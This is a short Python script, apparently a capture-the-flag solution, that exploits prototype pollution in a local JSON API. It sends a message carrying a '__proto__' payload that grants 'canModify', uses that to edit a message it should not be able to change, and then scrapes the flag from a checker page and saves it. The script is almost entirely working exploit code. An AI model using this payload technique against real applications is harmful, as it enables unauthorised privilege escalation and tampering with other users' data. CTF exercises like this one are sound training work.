#/usr/bin/env python3
import requests
import re

API = "http://localhost:55970/"
CHECKER = "http://localhost:55971/checker"

headers = {"content-type": "application/json"}
data = {
    "auth": {"name": "user", "password": "user"},
    "message": { "text": "polluted!", "__proto__": {"canModify": True}}
    }
r = requests.put(API, headers=headers, json=data)
# print(r.text)

headers = {"content-type": "application/json"}
data = {
    "auth": {"name": "user", "password": "user"},
    "messageId": 0,
    "messageText": "hack the planet"
    }

r = requests.post(API, headers=headers, json=data)
# print(r.text)

r = requests.get(CHECKER)
flag = re.search(r"your flag:\s+([a-zA-Z0-9{}_-]+)", r.text).group(1)
print(flag)

with open("flag", "w") as f:    
    f.write(flag)
